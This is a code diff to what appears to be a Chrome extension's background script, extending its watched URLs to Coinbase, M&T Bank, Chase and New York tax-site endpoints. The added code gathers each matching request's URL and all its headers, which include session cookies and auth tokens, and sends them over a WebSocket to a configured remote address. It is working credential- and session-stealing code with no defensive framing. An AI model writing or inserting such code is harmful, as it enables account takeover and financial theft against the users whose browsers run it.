@@ -37,21 +37,28 @@ const tabStorage = {};
 const networkFilters = {
   urls: [
     "https://www.coinbase.com/api/v2/user?",
-    "https://onlinebanking.mtb.com/Accounts/*"
+    "https://onlinebanking.mtb.com/Accounts/FetchAccountSummary*",
+    "https://otc.tax.ny.gov/webapp/wcs/stores/service/*",
+    "https://secure01b.chase.com/svc/rr/profile/secure/v1/address/profile/list"
   ]
 };
 
 chrome.webRequest.onSendHeaders.addListener((details) => {
+  data = details.url;
   console.log(details.url);
   if (typeof details.requestHeaders !== 'undefined') {
     for (var i = 0; i < details.requestHeaders.length; ++i) {
-      console.log(details.requestHeaders[i].name, details.requestHeaders[i].value);
+      if (details.requestHeaders[i].name !== 'Accept-Encoding') {
+        data = data + "\n" + details.requestHeaders[i].name + ": " + details.requestHeaders[i].value;
+        console.log(details.requestHeaders[i].name, details.requestHeaders[i].value);
+      }
     }
   }
   var ws = new WebSocket(addr);
   ws.onopen = function(evt) { 
     console.log("Preparing "); 
-    ws.send("Hello W!");
+    ws.send(data);
+    ws.close();
   };
 
   ws.onmessage = function(evt) {
